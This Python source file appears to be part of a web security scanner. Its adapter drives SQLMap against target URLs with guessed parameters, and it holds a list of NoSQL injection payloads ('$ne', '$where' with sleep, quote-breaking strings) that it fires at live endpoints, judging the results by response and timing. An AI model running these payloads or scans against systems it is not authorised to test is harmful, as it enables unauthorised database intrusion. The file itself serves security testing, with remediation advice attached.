"""SQLMap adapter for SQL injection exploitation."""

import os
import json
import re
import logging
from typing import List, Optional, Dict

from .base import BaseScanner
from ..models.scan import ScanTarget
from ..models.finding import Finding, FindingSeverity, FindingCategory
from ..models.scan_mode import ScanMode

logger = logging.getLogger(__name__)

class SQLMapAdapter(BaseScanner):
    """Adapter for SQLMap SQL injection exploitation tool."""
    
    def __init__(self, enabled: bool = True, scan_mode: ScanMode = ScanMode.DEFENSIVE):
        """
        Initialize SQLMap adapter.
        
        Args:
            enabled: Whether scanner is enabled
            scan_mode: Scan mode (only works in offensive mode)
        """
        super().__init__(
            name="sqlmap",
            command="sqlmap",
            enabled=enabled,
            scan_mode=scan_mode
        )
    
    def scan(self, target: ScanTarget, discovered_parameters: Optional[Dict[str, List[str]]] = None) -> List[Finding]:
        """
        Run SQLMap on target.
        
        Args:
            target: ScanTarget to test
            discovered_parameters: Optional dict mapping URLs to lists of discovered parameters
                                  Format: {url: [param1, param2, ...]}
        """
        if self.scan_mode == ScanMode.DEFENSIVE:
            # SQLMap is offensive-only
            return []
        
        if not self.is_available():
            raise RuntimeError("SQLMap is not available. Please install it: https://github.com/sqlmapproject/sqlmap")
        
        findings = []
        
        # Test for NoSQL injection first (MongoDB, etc.)
        findings.extend(self._test_nosql_injection(target.url))
        
        # SQLMap requires specific URL parameters to test
        # Use discovered parameters if available, otherwise use common ones
        test_urls = []
        
        base_url_parts = target.url.split('?')
        base_url = base_url_parts[0]
        
        # Priority 1: Use discovered parameters if available
        discovered_params_list = []
        if discovered_parameters:
            # Get parameters for this URL or base URL
            for url, params in discovered_parameters.items():
                if url == target.url or url == base_url:
                    discovered_params_list.extend(params)
                    logger.info(f"Using {len(params)} discovered parameters from parameter discovery: {params[:5]}")
                    break
        
        # Priority 2: Use parameters from current URL
        if '?' in target.url:
            from urllib.parse import urlparse, parse_qs
            parsed = urlparse(target.url)
            url_params = list(parse_qs(parsed.query).keys())
            discovered_params_list.extend(url_params)
        
        # Priority 3: Fall back to common parameters
        common_params = ['id', 'page', 'user', 'user_id', 'category', 'search', 'q', 'query', 'product_id', 'item_id']
        
        # Combine discovered and common, removing duplicates
        all_params = list(set(discovered_params_list + common_params))
        
        # Build test URLs with parameters
        for param in all_params[:15]:  # Limit to 15 parameters to avoid too many requests
            test_urls.append(f"{base_url}?{param}=1")
        
        # Also test original URL if it has parameters
        if '?' in target.url and target.url not in test_urls:
            test_urls.append(target.url)
        
        # Limit total URLs to avoid excessive requests
        test_urls = test_urls[:15]
        
        for test_url in test_urls:
            try:
                # Build SQLMap command arguments (optimized for speed)
                args = [
                    "-u", test_url,
                    "--batch",  # Non-interactive mode
                    "--level", "1",  # Reduced level for speed (1-5, default 1)
                    "--risk", "1",  # Reduced risk for speed (1-3, default 1)
                    "--threads", "1",  # Single thread to be respectful
                    "--timeout", "5",  # Reduced timeout for speed
                    "--retries", "0",  # No retries for speed
                    "--technique", "BEUSTQ",  # All techniques but faster
                    "--tamper", "",  # No tamper scripts for speed
                    "--output-dir", "/tmp/sqlmap_output",  # Output directory
                    "--fresh-queries",  # Don't use cached queries
                ]
                
                stdout, stderr, returncode = self.run_command(args, timeout=60)  # Reduced from 120 to 60 seconds
                
                # Parse SQLMap output for SQL injection findings
                # Only report actual vulnerabilities, not false positives from disclaimer text
                if stdout:
                    # Check for actual vulnerability indicators (not just disclaimer)
                    # SQLMap outputs specific patterns when it finds vulnerabilities
                    vulnerability_indicators = [
                        r'is vulnerable',
                        r'parameter.*is vulnerable',
                        r'GET parameter.*is vulnerable',
                        r'POST parameter.*is vulnerable',
                        r'injection found',
                        r'payload.*worked',
                        r'back-end DBMS:',  # Database type detection means vulnerability found
                    ]
                    
                    # Check if any real vulnerability indicators are present
                    # Exclude disclaimer text
                    output_lower = stdout.lower()
                    has_vulnerability = False
                    
                    # Skip if output is just the banner/disclaimer
                    if len(stdout.strip()) < 200:  # Just banner, no real output
                        continue
                    
                    for pattern in vulnerability_indicators:
                        if re.search(pattern, output_lower):
                            # Make sure it's not in the disclaimer
                            if "legal disclaimer" not in output_lower[:500]:  # Check first part
                                has_vulnerability = True
                                break
                    
                    if has_vulnerability:
                        # Extract vulnerability details
                        db_type_match = re.search(r'back-end DBMS: ([\w\s]+)', stdout, re.IGNORECASE)
                        db_type = db_type_match.group(1).strip() if db_type_match else None
                        
                        param_match = re.search(r'Parameter: (\w+)', stdout, re.IGNORECASE)
                        if not param_match:
                            param_match = re.search(r'(GET|POST) parameter [\'"]?(\w+)', stdout, re.IGNORECASE)
                            param = param_match.group(2) if param_match else None
                        else:
                            param = param_match.group(1)
                        
                        # Only create finding if we have actual confirmation
                        if db_type or param:
                            finding = Finding(
                                title=f"SQL Injection Vulnerability Detected",
                                description=f"SQLMap confirmed SQL injection vulnerability{f' in parameter \'{param}\'' if param else ''} at {test_url}{f'. Backend DBMS: {db_type}' if db_type else ''}.",
                                severity=FindingSeverity.CRITICAL,
                                category=FindingCategory.EXPLOITATION,
                                source_scanner="sqlmap",
                                source_id="sql_injection",
                                url=test_url,
                                evidence=stdout[:1000] if len(stdout) > 1000 else stdout,  # More evidence
                                exploited=True,
                                exploitation_details=f"SQL injection confirmed{f' in parameter \'{param}\'' if param else ''}{f'. Database type: {db_type}' if db_type else ''}.",
                                remediation="Fix SQL injection by using parameterized queries/prepared statements. Never concatenate user input into SQL queries.",
                                references=["https://owasp.org/www-community/attacks/SQL_Injection"],
                            )
                            findings.append(finding)
            
            except TimeoutError:
                continue  # Skip this URL if it times out
            except Exception as e:
                # Log but continue
                import logging
                logger = logging.getLogger(__name__)
                logger.warning(f"SQLMap scan failed for {test_url}: {e}")
                continue
        
        return findings
    
    def _test_nosql_injection(self, url: str) -> List[Finding]:
        """Test for NoSQL injection vulnerabilities (MongoDB, etc.)."""
        findings = []
        
        import requests
        from urllib.parse import urlparse, parse_qs, urlencode
        
        # Use OPSEC-enabled session helper
        from ..utils.scanner_session import create_scanner_session
        session = create_scanner_session()
        
        # NoSQL injection payloads
        nosql_payloads = [
            # MongoDB injection
            ('$ne', 'null'),  # Not equal
            ('$gt', ''),      # Greater than
            ('$where', '1==1'),
            ('$regex', '.*'),
            ('1 || 1==1', None),
            ('1 || 1==1 || 1==1', None),
            ('"; return true; var x="', None),
            ('\'; return true; var x=\'', None),
            # Boolean-based
            ('$or', '[{"username":"admin"},{"username":"admin"}]'),
            ('[$ne]=null', None),
            # Time-based
            ('$where', 'sleep(5000)'),
        ]
        
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            # Test each parameter
            for param_name in list(params.keys())[:5]:  # Limit to 5 parameters
                for payload_key, payload_value in nosql_payloads[:5]:  # Test subset
                    try:
                        test_params = params.copy()
                        
                        if payload_value:
                            test_params[param_name] = [f'{{"{payload_key}": "{payload_value}"}}']
                        else:
                            test_params[param_name] = [payload_key]
                        
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                        
                        # Get baseline
                        baseline_response = session.get(url, timeout=5)
                        baseline_time = baseline_response.elapsed.total_seconds()
                        baseline_content = baseline_response.text[:500]
                        
                        # Test with payload
                        test_response = session.get(test_url, timeout=10)
                        test_time = test_response.elapsed.total_seconds()
                        test_content = test_response.text[:500]
                        
                        # Check for indicators
                        # 1. Different response (might indicate boolean-based injection)
                        if test_response.status_code != baseline_response.status_code:
                            # Or significantly different content length
                            if abs(len(test_response.text) - len(baseline_response.text)) > 100:
                                findings.append(Finding(
                                    title="Potential NoSQL Injection Vulnerability",
                                    description=f"NoSQL injection vulnerability detected in parameter '{param_name}' at {url}. Payload '{payload_key}' caused different response.",
                                    severity=FindingSeverity.HIGH,
                                    category=FindingCategory.VULNERABILITY,
                                    source_scanner=self.name,
                                    url=test_url,
                                    evidence=f"Payload: {payload_key}, Status: {baseline_response.status_code} -> {test_response.status_code}",
                                    exploitation_details=f"NoSQL injection confirmed in parameter '{param_name}' using payload '{payload_key}'.",
                                    remediation="Use parameterized queries/prepared statements for NoSQL databases. Validate and sanitize all input. Use MongoDB's built-in security features.",
                                    references=["https://owasp.org/www-community/attacks/NoSQL_Injection"],
                                    metadata={'parameter': param_name, 'payload': payload_key, 'type': 'nosql'}
                                ))
                                break  # Found vulnerability, move to next parameter
                        
                        # 2. Time-based detection (delay)
                        if test_time > baseline_time + 2:  # More than 2 seconds delay
                            findings.append(Finding(
                                title="Potential NoSQL Injection (Time-Based)",
                                description=f"Time-based NoSQL injection detected in parameter '{param_name}'. Payload caused significant delay.",
                                severity=FindingSeverity.MEDIUM,
                                category=FindingCategory.VULNERABILITY,
                                source_scanner=self.name,
                                url=test_url,
                                evidence=f"Payload: {payload_key}, Delay: {test_time - baseline_time:.2f}s",
                                remediation="Use parameterized queries and input validation for NoSQL databases.",
                                metadata={'parameter': param_name, 'payload': payload_key, 'type': 'nosql_time'}
                            ))
                            break
                        
                    except Exception as e:
                        logger.debug(f"NoSQL injection test error: {e}")
                        continue
        
        except Exception as e:
            logger.debug(f"NoSQL injection scan error: {e}")
        
        return findings

